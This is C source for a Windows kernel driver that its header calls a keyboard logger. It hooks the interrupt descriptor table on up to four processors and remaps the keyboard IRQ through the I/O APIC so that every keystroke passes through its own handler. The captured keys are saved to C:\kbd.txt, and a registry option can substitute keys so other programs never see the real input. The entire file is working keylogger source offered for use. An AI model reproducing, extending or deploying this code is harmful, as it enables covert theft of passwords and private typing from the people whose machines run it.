
/*
 *  KEYBOARD LOG IOAPIC VERSION  BY  WOWOCOCK 2009-05-04
 *  CURRENT 4 CORE support BUT YOU CAN EXTEND IT BY YOURSELF
 */


#include "Kb_sniffMp.h"
#include "KbRelated.h"
#pragma warning(disable:4996 4276)

int mykb_int=0;
int mynewkb_int =0;
int oldkb_int =0x93;
//unsigned char *keystroke_buffer=NULL;
// key buffer ,contains the the that you input
unsigned char keystroke_buffer[MAX_CHARS]={0};
KSPIN_LOCK KbdLock={0};
//if we can replace the key with other key,so no other application can get the real key. 
BOOL bEnableReplace = FALSE;
//////////////////////////////////////////////////////////////////////////
// Intel 82093AA I/O Advanced Programmable Interrupt Controller (I/O APIC) Datasheet.pdf
int search_irq1()
{
	unsigned char *pIoRegSel;
	DWORD *pIoWin;
	int ch,temp;

	PHYSICAL_ADDRESS	phys ;
	PVOID				pAddr;

	RtlZeroMemory(&phys,sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xFEC00000;
	pAddr = MmMapIoSpace(phys, 0x14, MmNonCached);
	//if (pAddr == NULL)
	if (!MmIsAddressValid(pAddr))
		return 0;

	temp = *(PDWORD)pAddr;

	pIoRegSel = (unsigned char *)pAddr;
	pIoWin = (DWORD *)((unsigned char *)(pAddr) + 0x10);


	{
		int  i;
		unsigned char j;

		for (i = 0, j = 0x10; i <= 0x17; i++, j += 2)
		{
			*pIoRegSel = j;
			ch = *pIoWin;
			DbgPrint("RedTbl[%02d]: 0x%02X\n", i, ch);
		}
	}


	*pIoRegSel = 0x12;	// irq1
	ch = *pIoWin;
	ch &= 0xff;
	MmUnmapIoSpace(pAddr, 0x14);

	return ch;
}

int set_irq1(int intNumber)
{
	unsigned char *pIoRegSel;
	DWORD *pIoWin;
	int ch,temp;

	PHYSICAL_ADDRESS	phys;
	PVOID				pAddr;

	RtlZeroMemory(&phys,sizeof(PHYSICAL_ADDRESS));
	ch = intNumber;

	phys.u.LowPart = 0xFEC00000;
	pAddr = MmMapIoSpace(phys, 0x14, MmNonCached);
	//if (pAddr == NULL)
	if (!MmIsAddressValid(pAddr))
		return 0;
	temp = *(PDWORD)pAddr;

	pIoRegSel = (unsigned char *)pAddr;
	pIoWin = (DWORD *)((unsigned char *)(pAddr) + 0x10);


	//{
	//	int  i;
	//	unsigned char j;
	//
	//	for (i = 0, j = 0x10; i <= 0x17; i++, j += 2)
	//	{
	//		*pIoRegSel = j;
	//		ch = *pIoWin;
	//		DbgPrint("RedTbl[%02d]: 0x%02X\n", i, ch);
	//	}
	//}


	*pIoRegSel = 0x12;	// irq1
	ch = *pIoWin;
	ch &= 0xffffff00;
	ch |= intNumber;
	*pIoWin = ch;

	MmUnmapIoSpace(pAddr, 0x14);

	return ch;
}
int GetNullIdtNumber(PBYTE idtBase)
{
	int idtNum=0;
	int i;
	for(i=0x20;i<0x2a;i++)
	{
		if (*(PDWORD)(idtBase+i*sizeof(IDTENTRY)+4)==0)
		{
			idtNum = i;
			break;
		}
	}
	return idtNum;
}
//////////////////////////////////////////////////////////////////////////
ULONG   allProcessorDone =0; // count for the multi-processor support
KDPC    kDpc = {0}; // a DPC Object
unsigned long old_ISR_pointer0 = 0;
unsigned long old_ISR_pointer1 = 0;
unsigned long old_ISR_pointer2 = 0;
unsigned long old_ISR_pointer3 = 0;

DWORD cpuNum[16] = {0};
IDTINFO		idt_info[16]= {0};
IDTENTRY*	idt_entries[16]= {0};
IDTENTRY oldidt_entries[16] = {0};
BOOL bAlreadySetIrq = FALSE;
// naked functions have no prolog/epilog code - they are functionally like the 
// target of a goto statement
__declspec(naked) my_interrupt_hook0()
{
	__asm
	{
		pushad					// save all general purpose registers
			pushfd					// save the flags register
			call	print_keystroke	// call function
			popfd					// restore the flags
			popad					// restore the general registers
			jmp		old_ISR_pointer0	// goto the original ISR
			/*int 93h
			iretd*/
	}
}
__declspec(naked) my_interrupt_hook1()
{
	__asm
	{
		pushad					// save all general purpose registers
			pushfd					// save the flags register
			call	print_keystroke	// call function
			popfd					// restore the flags
			popad					// restore the general registers
			jmp		old_ISR_pointer1	// goto the original ISR
			/*int 93h
			iretd*/
	}
}
__declspec(naked) my_interrupt_hook2()
{
	__asm
	{
		pushad					// save all general purpose registers
			pushfd					// save the flags register
			call	print_keystroke	// call function
			popfd					// restore the flags
			popad					// restore the general registers
			jmp		old_ISR_pointer2	// goto the original ISR
			/*int 93h
			iretd*/
	}
}
__declspec(naked) my_interrupt_hook3()
{
	__asm
	{
		pushad					// save all general purpose registers
			pushfd					// save the flags register
			call	print_keystroke	// call function
			popfd					// restore the flags
			popad					// restore the general registers
			jmp		old_ISR_pointer3	// goto the original ISR
			/*int 93h
			iretd*/
	}
}

void setMyKbdInt(int oldkb_int,int newkb_int,IDTENTRY* idt_entries,DWORD cpuNum)
{
	ULONG my_interrupt_hook = 0;
	RtlCopyMemory((PBYTE)(&oldidt_entries[cpuNum]),(PBYTE)idt_entries+newkb_int*sizeof(IDTENTRY),sizeof(IDTENTRY));
	RtlCopyMemory((PBYTE)idt_entries+newkb_int*sizeof(IDTENTRY),(PBYTE)idt_entries+oldkb_int*sizeof(IDTENTRY),sizeof(IDTENTRY));
    
	switch(cpuNum)
	{
	case 0:
		my_interrupt_hook = (ULONG)my_interrupt_hook0;
		break;
	case 1:
		my_interrupt_hook = (ULONG)my_interrupt_hook1;
		break;
	case 2:
		my_interrupt_hook = (ULONG)my_interrupt_hook2;
	    break;
	case 3:
		my_interrupt_hook = (ULONG)my_interrupt_hook3;
	    break;
	default:
	    break;
	}
	// remember we disable interrupts while we patch the table
	__asm cli
	idt_entries[newkb_int].LowOffset = (unsigned short)my_interrupt_hook;
	idt_entries[newkb_int].HiOffset = (unsigned short)((unsigned long)my_interrupt_hook >> 16);
	__asm sti

	DbgPrint("Hooking Interrupt complete: New = 0x%08X\n", my_interrupt_hook);
	/*   keystroke_buffer = ExAllocatePool(NonPagedPool,MAX_CHARS);
	if (keystroke_buffer)
	{
	RtlZeroMemory(keystroke_buffer,MAX_CHARS);
	}*/
	return ;

}
VOID MPCreateThread(VOID (*FunctionPointer)(IN PKDPC, IN PVOID, IN PVOID, IN PVOID))
{
	/*
	*
	* Multi-Processor Consideration ::
	*
	* Each processor has it's own IDT.
	* 
	*/
	CCHAR i;
	long currentProcessor =0;
	PKDPC pkDpc =NULL;
	KIRQL oldIrql, currentIrql;

	allProcessorDone =0;

	currentIrql = KeGetCurrentIrql();

	if (currentIrql < DISPATCH_LEVEL)
		KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

	InterlockedAnd(&allProcessorDone, 0);

	pkDpc = (PKDPC)ExAllocatePoolWithTag(NonPagedPool, KeNumberProcessors * sizeof(KDPC), (ULONG)' pni');

	if (!pkDpc)
	{
		DbgPrint("Insufficient Resource error\n");
		return;
	}

	currentProcessor = KeGetCurrentProcessorNumber();

	for (i = 0; i < KeNumberProcessors; i++)
	{
		cpuNum[i] =i;
		KeInitializeDpc(&pkDpc[i],
			FunctionPointer,
			&cpuNum[i]);
		KeSetTargetProcessorDpc(&pkDpc[i], i);
		KeInsertQueueDpc(&pkDpc[i], NULL, NULL);
	}

	// wait for all of the processor's hooking initialization.
	while(InterlockedCompareExchange(&allProcessorDone, KeNumberProcessors - 1, KeNumberProcessors - 1) != KeNumberProcessors - 1)
	{
		_asm pause;
	}

	if (currentIrql < DISPATCH_LEVEL)
		KeLowerIrql(oldIrql);

	if (pkDpc)
	{
		ExFreePool(pkDpc);
		pkDpc = NULL;
	}
}

VOID MPHandlerSetup(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	DWORD currentcpu =  *(PDWORD)DeferredContext;
    unsigned long old_ISR_pointer_tmp = 0 ;
	IDTENTRY* current;
	//// load idt_info
	_asm
	{
		lea eax,[idt_info]
        mov ecx,currentcpu
		lea eax,[eax+ecx*8]//  sizeof(IDTINFO )
	}
	__asm	sidt	fword ptr[eax]
    //idt base
	current =idt_entries[currentcpu] = (IDTENTRY*) MAKELONG(idt_info[currentcpu].LowIDTbase,idt_info[currentcpu].HiIDTbase);
	if (mynewkb_int ==0)
	{
		mynewkb_int=GetNullIdtNumber((PBYTE)idt_entries[currentcpu]);
		if (mynewkb_int ==0)
		{
			return;
		}
	}

	DbgPrint("Hooking Interrupt...");
	old_ISR_pointer_tmp  = MAKELONG(current[oldkb_int].LowOffset,current[oldkb_int].HiOffset);
	switch(currentcpu)
	{
	case 0:
		old_ISR_pointer0 = old_ISR_pointer_tmp;
		break;
	case 1:
		old_ISR_pointer1 = old_ISR_pointer_tmp;
		break;
	case 2:
		old_ISR_pointer2 = old_ISR_pointer_tmp;
	    break;
	case 3:
		old_ISR_pointer3 = old_ISR_pointer_tmp;
	    break;
	default:
	    break;
	}
	//if (*(PBYTE)old_ISR_pointer == 0x68)//may hook by softice
	//{
	//	old_ISR_pointer = *(PDWORD)((PBYTE)old_ISR_pointer+1);
	//}
	DbgPrint("old_ISR_pointer:%8x",old_ISR_pointer_tmp);
	//
	setMyKbdInt(oldkb_int,mynewkb_int,idt_entries[currentcpu],currentcpu);
	if (bAlreadySetIrq == FALSE)
	{
		set_irq1(mynewkb_int);
		bAlreadySetIrq = TRUE;
	}
	InterlockedIncrement(&allProcessorDone);
	DbgPrint("Processor [%x] :: Complete.\n", allProcessorDone);
}

VOID MPHandlerCleanUp(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
	DWORD currentcpu =  *(PDWORD)DeferredContext;
	unsigned long old_ISR_pointer_tmp = 0 ;
	//// load idt_info
	_asm
	{
		lea eax,[idt_info]
			mov ecx,currentcpu
			lea eax,[eax+ecx*8]// sizeof(IDTINFO )
	}
	__asm	sidt	fword ptr[eax]
	//idt base
	idt_entries[currentcpu] = (IDTENTRY*) MAKELONG(idt_info[currentcpu].LowIDTbase,idt_info[currentcpu].HiIDTbase);
	RtlCopyMemory((PBYTE)idt_entries[currentcpu]+mynewkb_int*sizeof(IDTENTRY),(PBYTE)(&oldidt_entries[currentcpu]),sizeof(IDTENTRY));
	InterlockedIncrement(&allProcessorDone);
	DbgPrint("Processor [%x] :: Complete.\n", allProcessorDone);
}
//////////////////////////////////////////////////////////////////////////
// save the key buffer to the file.
void SaveToFile(IN PCHAR buffer,IN int length)
{
	WCHAR fileName[] = L"\\??\\C:\\kbd.txt";
	UNICODE_STRING unifilename;
	NTSTATUS status;
	OBJECT_ATTRIBUTES oa;
	HANDLE hFile;
	IO_STATUS_BLOCK iostatus;
	LARGE_INTEGER  ByteOffset={0} ;
	if (!buffer)
	{
		return;
	}
	RtlInitUnicodeString(&unifilename,fileName);
	InitializeObjectAttributes(&oa,&unifilename,
		OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,
		NULL,NULL);

	status = ZwCreateFile(&hFile,FILE_APPEND_DATA,&oa,&iostatus,NULL,FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_DELETE|FILE_SHARE_WRITE|FILE_SHARE_READ,FILE_OVERWRITE_IF,
		0,0,0);

	if(NT_SUCCESS(status))
	{
        status=ZwWriteFile(hFile,NULL,NULL,NULL,&iostatus,buffer,length,&ByteOffset,NULL);
		if (!(NT_SUCCESS(status)))
		{
			DbgPrint("ZwWriteFile Failed %8x",status);
		}
		ZwClose(hFile);
	}
	else
		DbgPrint("ZwCreateFile Failed %8x",status);
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	
	DbgPrint("Keystroke Buffer is: ");
	DbgPrint("%s", keystroke_buffer);
	SaveToFile(keystroke_buffer,strlen(keystroke_buffer));
	/*if (keystroke_buffer)
	{
		ExFreePool(keystroke_buffer);
	}*/
	MPCreateThread(MPHandlerCleanUp); // IDT Setup
	set_irq1(oldkb_int);
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	KeInitializeSpinLock(&KbdLock);
	theDriverObject->DriverUnload  = OnUnload;
	ReadRegistery(theRegistryPath);

	oldkb_int = search_irq1();
	DbgPrint("old kb_int = 0x%02X\n", oldkb_int);
    oldkb_int &= 0xff;

	if (oldkb_int == 0xff)
	{
		oldkb_int =0x93;
	}
	
	MPCreateThread(MPHandlerSetup); // IDT Setup
	mykb_int = search_irq1();
	DbgPrint("new kb_int = 0x%02X\n", mykb_int);
	return STATUS_SUCCESS;
}//////////////////////////////////////////////////////////////////////////
//read EnableReplace key from reg to check if replace the key with our define key
void ReadRegistery(IN PUNICODE_STRING RegistryPath)
{
	UNICODE_STRING              parameter_path;
	RTL_QUERY_REGISTRY_TABLE    query_table[2];
	NTSTATUS                    status;

	parameter_path.Length = 0;
	parameter_path.MaximumLength = RegistryPath->Length + sizeof(PARAMETER_KEY);
	parameter_path.Buffer = (PWSTR) ExAllocatePool(PagedPool, parameter_path.MaximumLength);

	if (parameter_path.Buffer == NULL)
	{
		return;
	}
    RtlZeroMemory(parameter_path.Buffer,parameter_path.MaximumLength);

	RtlCopyUnicodeString(&parameter_path, RegistryPath);

	RtlAppendUnicodeToString(&parameter_path, PARAMETER_KEY);

	RtlZeroMemory(&query_table[0], sizeof(query_table));

	query_table[0].Flags = RTL_QUERY_REGISTRY_DIRECT | RTL_QUERY_REGISTRY_REQUIRED;
	query_table[0].Name = ENABLEWRITEPORT_VALUE;
	query_table[0].EntryContext = &bEnableReplace;

	status = RtlQueryRegistryValues(
		RTL_REGISTRY_ABSOLUTE,
		parameter_path.Buffer,
		&query_table[0],
		NULL,
		NULL
		);

	ExFreePool(parameter_path.Buffer);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("Kb_sniff_Mp: Query registry failed.\n"));
	}
}
